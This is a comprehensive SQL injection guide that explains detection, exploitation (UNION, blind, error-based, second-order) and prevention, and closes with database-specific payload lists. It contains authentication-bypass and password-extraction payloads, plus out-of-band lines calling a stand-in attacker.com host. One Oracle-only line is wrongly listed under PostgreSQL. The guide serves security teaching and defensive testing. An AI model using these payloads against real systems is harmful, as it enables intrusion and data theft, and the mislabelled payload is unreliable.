---
title: SQL Injection - Comprehensive Guide
date: 2025-11-29
category: guides
tags:
  - web
  - sqli
---

Table of Contents
-----------------

1.  [What is SQL Injection?](#What-is-SQL-Injection)
2.  [Types of SQL Injection](#Types-of-SQL-Injection)
3.  [Detecting SQL Injection Vulnerabilities](#Detecting-SQL-Injection-Vulnerabilities)
4.  [SQL Injection in Different Query Contexts](#SQL-Injection-in-Different-Query-Contexts)
5.  [Exploitation Techniques](#Exploitation-Techniques)
6.  [Advanced SQL Injection Techniques](#Advanced-SQL-Injection-Techniques)
7.  [Preventing SQL Injection](#Preventing-SQL-Injection)
8.  [SQL Injection Payloads](#SQL-Injection-Payloads)

What is SQL Injection?
----------------------

SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in an application's software by inserting or "injecting" SQL statements via an input field from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system, and in some cases issue commands to the operating system.

### How SQL Injection Works

When an application takes user input and incorporates it into a SQL query without proper sanitization, it creates a vulnerability. The attacker can then manipulate the query by injecting SQL syntax that changes the original query's behavior.

For example, consider this vulnerable code:

    String query = "SELECT * FROM users WHERE username = '" + userInput + "'";
    

If an attacker provides the input: `admin' OR '1'='1`, the query becomes:

    SELECT * FROM users WHERE username = 'admin' OR '1'='1'
    

Since '1'='1' is always true, this query returns all users, bypassing authentication.

Types of SQL Injection
----------------------

### First-order SQL Injection

First-order SQL injection occurs when the application processes user input from an HTTP request and incorporates the input into a SQL query in an unsafe way. The attack is executed immediately when the input is submitted.

### Second-order SQL Injection (Stored SQL Injection)

Second-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use. The vulnerability is triggered later when the application retrieves the stored data and incorporates it into a SQL query without proper sanitization.

### In-band SQL Injection

In-band SQL Injection is the most common and easiest-to-exploit type of SQL injection. In this attack, the attacker can use the same communication channel to both launch the attack and gather results.

### Inferential SQL Injection (Blind SQL Injection)

Inferential SQL Injection, also known as Blind SQL Injection, is a type of SQL injection where the attacker doesn't get a direct response from the database but can reconstruct the information by sending specific queries and observing the application's response or behavior.

### Out-of-band SQL Injection

Out-of-band SQL Injection is a type of SQL injection where the attacker can't get the response from the same channel but can trigger the server to make a DNS or HTTP request to a server they control.

Detecting SQL Injection Vulnerabilities
---------------------------------------

### 1\. Single Quote Test

Submit a single quote character `'` and look for errors or other anomalies.

    '
    

**What happens on the server:** The single quote breaks the SQL syntax by creating an unbalanced string:

    SELECT * FROM users WHERE username = '';   -- ❌ syntax error!
    

**Why it works:** If the input is not sanitized, this causes SQL syntax errors, server error pages, blank responses, or anomalies in behavior, confirming that the input is being processed in an SQL query and might be vulnerable to SQL injection.

### 2\. SQL-Specific Syntax Test

Submit SQL-specific syntax that evaluates to the original value and to a different value, then look for systematic differences in the application responses.

    ' AND '1'='1    -- Returns original results
    ' AND '1'='2    -- Changes logic, returns no results
    

**What happens on the server:** The first query becomes:

    SELECT * FROM products WHERE category = 'clothing' AND '1'='1';
    

This always returns true and behaves like normal.

The second query becomes:

    SELECT * FROM products WHERE category = 'clothing' AND '1'='2';
    

This is false, so it returns no results.

**Why it works:** By testing how the app responds to true vs. false conditions injected into the SQL, differences in responses indicate SQL injection is possible.

### 3\. Boolean Conditions Test

Submit Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the application's responses.

    ' OR 1=1--
    ' OR 1=2--
    

**What happens on the server:** For a query like `SELECT * FROM users WHERE username = 'admin';`, injecting `admin' OR 1=1--` makes it:

    SELECT * FROM users WHERE username = 'admin' OR 1=1--';
    

Since 1=1 is always true, the condition bypasses the original logic.

### 4\. Time Delay Test

Submit payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.

    ' OR SLEEP(5)--                    -- MySQL
    ' OR pg_sleep(5)--                 -- PostgreSQL
    ' WAITFOR DELAY '0:0:5'--          -- Microsoft SQL Server
    

**What happens on the server:** These payloads tell the database to pause execution for a specified time if the SQL is executed. If the response takes longer than usual, it confirms the injection was successful.

### 5\. Out-of-Band (OAST) Test

Submit OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.

    -- MySQL
    LOAD_FILE('\\\\attacker.com\\test')
    SELECT INTO OUTFILE '\\\\attacker.com\\output'
    
    -- Microsoft SQL Server
    exec xp_dirtree '\\attacker.com\share'
    exec master..xp_cmdshell 'nslookup attacker.com'
    
    -- Oracle
    SELECT UTL_HTTP.request('http://attacker.com') FROM dual;
    

**What happens on the server:** If the database executes these commands, it will make a network request to a server controlled by the attacker, confirming the vulnerability.

SQL Injection in Different Query Contexts
-----------------------------------------

SQL injection vulnerabilities can exist in **any part** of a SQL query where user-supplied data is incorporated without proper sanitization. Here is an exhaustive breakdown:

### 1\. Data Manipulation Language (DML) Statements

These are the most common places for SQLi, as they directly interact with application data.

#### `SELECT` Statements

*   **`WHERE` clause:** The most classic and frequent location.
    *   `SELECT * FROM users WHERE username = '[user_input]'`
*   **`SELECT` list (column names):** Less common, but possible.
    *   `SELECT [user_input] FROM products`
*   **`FROM` clause (table name):**
    *   `SELECT * FROM [user_input]`
*   **`JOIN` conditions:**
    *   `SELECT * FROM users u JOIN orders o ON u.id = o.[user_input]`
*   **`GROUP BY` clause:**
    *   `SELECT category, COUNT(*) FROM products GROUP BY [user_input]`
*   **`HAVING` clause:** Like a `WHERE` clause for aggregated results.
    *   `SELECT department, AVG(salary) FROM employees GROUP BY department HAVING AVG(salary) > [user_input]`
*   **`ORDER BY` clause:**
    *   `SELECT * FROM products ORDER BY [user_input]`
*   **`LIMIT` / `OFFSET` / `TOP` clause:** Used for pagination.
    *   `SELECT * FROM products LIMIT [user_input]`
    *   `SELECT TOP [user_input] * FROM users`

#### `INSERT` Statements

*   **`VALUES` clause:**
    *   `INSERT INTO users (username, password) VALUES ('[user_input_1]', '[user_input_2]')`
*   **Column Names:**
    *   `INSERT INTO users ([user_input]) VALUES ('mydata')`

> ⚠️ **Danger:** Injecting into `INSERT` statements can lead to unauthorized data being added to the database. This could be used to create new administrator accounts, insert malicious content into web pages, or corrupt data integrity.

#### `UPDATE` Statements

*   **`SET` clause (values):**
    *   `UPDATE users SET password = '[user_input]' WHERE id = 123`
*   **`SET` clause (column names):**
    *   `UPDATE users SET [user_input] = 'new_value' WHERE id = 123`
*   **`WHERE` clause:** This is extremely dangerous as it can lead to mass data modification.
    *   `UPDATE products SET price = 0 WHERE category = '[user_input]'`

> ⚠️ **Danger:** Injecting into `UPDATE` statements is one of the most destructive types of SQLi. An attacker can change all user passwords, modify product prices, or alter any data stored in the database, leading to data corruption and complete compromise of the application's integrity.

#### `DELETE` Statements

*   **`WHERE` clause:** This is the most critical injection point in `DELETE` statements, as it can lead to irreversible data loss.
    *   `DELETE FROM users WHERE id = [user_input]`
    *   `DELETE FROM users WHERE username = '[user_input]'`

> ⚠️ **Danger:** Injecting into `DELETE` statements can result in catastrophic data loss. An attacker could delete all users, all products, or any other critical data from the database. This is often unrecoverable without a proper backup.

### 2\. Data Definition Language (DDL) Statements

While less common in web applications, they can appear in admin interfaces or features that allow for dynamic database changes.

*   **`CREATE` / `ALTER` / `DROP` statements:**
    *   `CREATE TABLE [user_input] (id INT, data VARCHAR(255))`
    *   `ALTER TABLE users ADD COLUMN [user_input] VARCHAR(255)`
    *   `DROP TABLE [user_input]`

> ⚠️ **Danger:** Injecting into DDL statements can give an attacker full control over the database schema. They can create new tables to store malicious data, alter existing tables to change data types or add columns, or drop entire tables, causing complete data loss.

### 3\. Stored Procedures

User input passed to a stored procedure can be vulnerable if the procedure itself constructs and executes a dynamic SQL query unsafely.

*   **Example (SQL Server):**
    
        CREATE PROCEDURE sp_searchProducts
          @searchTerm NVARCHAR(100)
        AS
        BEGIN
          DECLARE @sql NVARCHAR(MAX);
          SET @sql = 'SELECT * FROM products WHERE name LIKE ''%' + @searchTerm + '%''';
          EXEC sp_executesql @sql; -- Vulnerable execution
        END
        
    
    An attacker could inject `' OR 1=1--` into `@searchTerm`.

### 4\. Other Contexts

*   **`WITH` clauses (Common Table Expressions - CTEs):**
    *   `WITH cte AS (SELECT * FROM table WHERE [user_input]) SELECT * FROM cte;`
*   **`CASE` statements:**
    *   `SELECT CASE WHEN [user_input] THEN 'true' ELSE 'false' END FROM table;`

Exploitation Techniques
-----------------------

### Retrieving Hidden Data

#### Using Comments to Modify Queries

Use SQL comments to modify the original query and bypass restrictions.

    -- Original query
    SELECT * FROM products WHERE category = 'Gifts' AND released = 1
    
    -- Injected payload
    '--
    
    -- Modified query
    SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
    -- The comment removes the AND released = 1 part
    

#### Using OR Conditions

Use OR conditions to bypass authentication or restrictions.

    -- Original query
    SELECT * FROM products WHERE category = 'Gifts' AND released = 1
    
    -- Injected payload
    ' OR 1=1--
    
    -- Modified query
    SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
    -- Returns all products regardless of category or release status
    

### Subverting Application Logic

#### Bypassing Authentication

Use SQL comments to bypass authentication checks.

    -- Original query
    SELECT * FROM users WHERE username = 'admin' AND password = 'password'
    
    -- Injected payload
    admin'--
    
    -- Modified query
    SELECT * FROM users WHERE username = 'admin'--' AND password = 'password'
    -- Returns the admin user without checking the password
    

### SQL Injection UNION Attacks

#### Understanding UNION Attacks

The UNION keyword enables you to execute one or more additional SELECT queries and append the results to the original query.

    SELECT a, b FROM table1 UNION SELECT c, d FROM table2
    

For a UNION query to work, two key requirements must be met:

1.  The individual queries must return the same number of columns.
2.  The data types in each column must be compatible between the individual queries.

#### Determining the Number of Columns

**Using ORDER BY:**

    ' ORDER BY 1--     -- Works
    ' ORDER BY 2--     -- Works
    ' ORDER BY 3--     -- Works
    ' ORDER BY 4--     -- Error (too high)
    

**Why it works:** The ORDER BY clause tells the database to sort results by the nth column. If n is larger than the number of actual columns, the database throws an error.

**Using NULL:**

    ' UNION SELECT NULL--           -- Error (wrong number of columns)
    ' UNION SELECT NULL,NULL--      -- Error (wrong number of columns)
    ' UNION SELECT NULL,NULL,NULL-- -- Success (correct number of columns)
    

**Why NULL is used:** NULL is convertible to every common data type, maximizing the chance that the payload will succeed when the column count is correct.

#### Finding Columns That Accept Strings

After determining the number of columns, find which columns can hold string data.

    ' UNION SELECT 'a',NULL,NULL--   -- Error (first column doesn't accept strings)
    ' UNION SELECT NULL,'a',NULL--   -- Success (second column accepts strings)
    ' UNION SELECT NULL,NULL,'a'--   -- Error (third column doesn't accept strings)
    

#### Retrieving Data from Other Tables

Once you've identified a column that accepts strings, you can retrieve data from other tables.

    ' UNION SELECT username,password FROM users--
    

#### Retrieving Multiple Values in a Single Column

If the query only returns a single column, you can concatenate multiple values together.

    -- Oracle
    ' UNION SELECT username || '~' || password FROM users--
    
    -- MySQL
    ' UNION SELECT CONCAT(username, '~', password) FROM users--
    
    -- PostgreSQL
    ' UNION SELECT username || '~' || password FROM users--
    

### Examining the Database

#### Querying Database Type and Version

Different databases have different queries to determine their version.

    -- MySQL
    SELECT @@version
    
    -- Oracle
    SELECT * FROM v$version
    
    -- PostgreSQL
    SELECT version()
    
    -- Microsoft SQL Server
    SELECT @@version
    

#### Listing Database Contents

**Non-Oracle databases:**

    -- List tables
    SELECT * FROM information_schema.tables
    
    -- List columns in a specific table
    SELECT * FROM information_schema.columns WHERE table_name = 'users'
    

**Oracle:**

    -- List tables
    SELECT * FROM all_tables
    
    -- List columns in a specific table
    SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
    

Advanced SQL Injection Techniques
---------------------------------

### Blind SQL Injection

#### Exploiting Blind SQL Injection with Conditional Responses

When the application behaves differently based on the query result but doesn't return data, you can extract information by triggering different responses conditionally.

    -- Test if a condition is true
    ' AND '1'='1--    -- Returns "Welcome back" message
    
    -- Test if a condition is false
    ' AND '1'='2--    -- No "Welcome back" message
    
    -- Extract data character by character
    ' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) > 'm--
    

**How it works:** By testing one character at a time, you can systematically determine the full password. For example, if the first test returns "Welcome back" and the second doesn't, you know the first character of the password is between 'm' and 't'.

#### Exploiting Blind SQL Injection with Conditional Errors

When the application doesn't show different responses based on the query result, you can trigger errors conditionally.

    -- Test if a condition is true (causes an error)
    ' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END)--
    
    -- Test if a condition is false (no error)
    ' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END)--
    
    -- Extract data character by character
    ' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN 1/0 ELSE NULL END FROM users WHERE username='admin')--
    

**How it works:** If the condition is true, the CASE statement returns 1/0, which causes a divide-by-zero error. If the condition is false, it returns NULL, which doesn't cause an error.

#### Exploiting Blind SQL Injection with Time Delays

When the application doesn't show different responses or errors, you can trigger time delays conditionally.

    -- Microsoft SQL Server
    '; IF (1=1) WAITFOR DELAY '0:0:10'--
    '; IF (1=2) WAITFOR DELAY '0:0:10'--
    
    -- MySQL
    ' AND SLEEP(10)--
    
    -- PostgreSQL
    '; SELECT pg_sleep(10)--
    

**How it works:** If the condition is true, the database will pause execution for the specified time. By measuring the response time, you can determine if the condition was true.

#### Exploiting Blind SQL Injection with Out-of-Band Techniques

When other methods don't work, you can trigger out-of-band interactions.

    -- MySQL
    ' UNION SELECT LOAD_FILE('\\\\attacker.com\\file')--
    
    -- Microsoft SQL Server
    '; exec master..xp_dirtree '\\attacker.com\share'--
    
    -- Oracle
    ' UNION SELECT UTL_HTTP.request('http://attacker.com') FROM dual--
    

**How it works:** These payloads cause the database to make a network request to a server controlled by the attacker. If the attacker's server receives a request, they know the injection was successful.

### Error-based SQL Injection

#### Extracting Data via Verbose Error Messages

When the application returns detailed error messages, you can extract data by triggering errors that include the data.

    -- Convert a string to an incompatible data type
    ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
    

**How it works:** Attempting to convert a string to an incompatible data type (like int) causes an error that includes the string value, effectively leaking the data.

### Second-order SQL Injection

Second-order SQL injection occurs when the application takes user input and stores it for future use. The vulnerability is triggered later when the application retrieves the stored data and incorporates it into a SQL query without proper sanitization.

**Example scenario:**

1.  Attacker registers with a malicious username: `admin'; UPDATE users SET password='hacked' WHERE username='admin'--`
2.  The application stores this username in the database without executing any SQL injection.
3.  Later, when the application retrieves this username and uses it in another query:
    
        SELECT * FROM user_options WHERE user='admin'; UPDATE users SET password='hacked' WHERE username='admin'--'
        
    
4.  The malicious part of the stored data is now executed, changing the admin's password.

Preventing SQL Injection
------------------------

### Parameterized Queries (Prepared Statements)

Parameterized queries separate SQL logic from data, preventing SQL injection.

    // Vulnerable code
    String query = "SELECT * FROM users WHERE username = '" + username + "'";
    Statement statement = connection.createStatement();
    ResultSet resultSet = statement.executeQuery(query);
    
    // Secure code
    PreparedStatement statement = connection.prepareStatement("SELECT * FROM users WHERE username = ?");
    statement.setString(1, username);
    ResultSet resultSet = statement.executeQuery();
    

**How it works:** The database first compiles the SQL query with placeholders (?), then safely inserts the user input as data rather than SQL code.

### Input Validation

Validate and sanitize all user input before using it in SQL queries.

    // Whitelist approach
    if (sortColumn.equals("name") || sortColumn.equals("price") || sortColumn.equals("date")) {
        query = "SELECT * FROM products ORDER BY " + sortColumn;
    } else {
        // Handle invalid input
    }
    

### Escaping User Input

If parameterized queries aren't possible, properly escape all user input.

    // Example for MySQL
    String escapedUsername = StringUtils.replace(username, "'", "''");
    String query = "SELECT * FROM users WHERE username = '" + escapedUsername + "'";
    

### Least Privilege Principle

Configure database accounts with the minimum necessary privileges. For example, a web application's database account shouldn't have permission to drop tables or modify the database schema.

### Web Application Firewall (WAF)

Implement a WAF to detect and block SQL injection attempts. However, don't rely solely on a WAF as attackers can often bypass them.

SQL Injection Payloads
----------------------

### Basic SQL Injection Payloads

    ' OR 1=1--
    ' OR 'a'='a--
    ' OR 1=1#
    ' OR 'a'='a#
    ' UNION SELECT NULL--
    ' UNION SELECT username,password FROM users--
    

### Advanced SQL Injection Payloads

    -- Time-based
    ' AND SLEEP(10)--
    '; WAITFOR DELAY '0:0:10'--
    
    -- Boolean-based
    ' AND (SELECT COUNT(*) FROM users) > 0--
    ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
    
    -- Error-based
    ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
    ' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END)--
    
    -- Out-of-band
    ' UNION SELECT LOAD_FILE('\\\\attacker.com\\file')--
    '; exec master..xp_dirtree '\\attacker.com\share'--
    

### Database-Specific Payloads

#### MySQL

    ' OR 1=1#
    ' UNION SELECT @@version--
    ' AND SLEEP(10)--
    ' UNION SELECT LOAD_FILE('\\\\attacker.com\\file')--
    

#### PostgreSQL

    ' OR 1=1--
    ' UNION SELECT version()--
    '; SELECT pg_sleep(10)--
    ' UNION SELECT UTL_HTTP.request('http://attacker.com') FROM dual--
    

#### Oracle

    ' OR 'a'='a'--
    ' UNION SELECT * FROM v$version--
    ' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--
    ' UNION SELECT UTL_HTTP.request('http://attacker.com') FROM dual--
    

#### Microsoft SQL Server

    ' OR 1=1--
    ' UNION SELECT @@version--
    '; WAITFOR DELAY '0:0:10'--
    '; exec master..xp_dirtree '\\attacker.com\share'--
    

Conclusion
----------

SQL injection remains one of the most critical web application security vulnerabilities. Understanding the various types of SQL injection and how they work is essential for both developers to prevent them and security professionals to test for them. By implementing proper input validation, parameterized queries, and following secure coding practices, developers can effectively prevent SQL injection vulnerabilities in their applications.
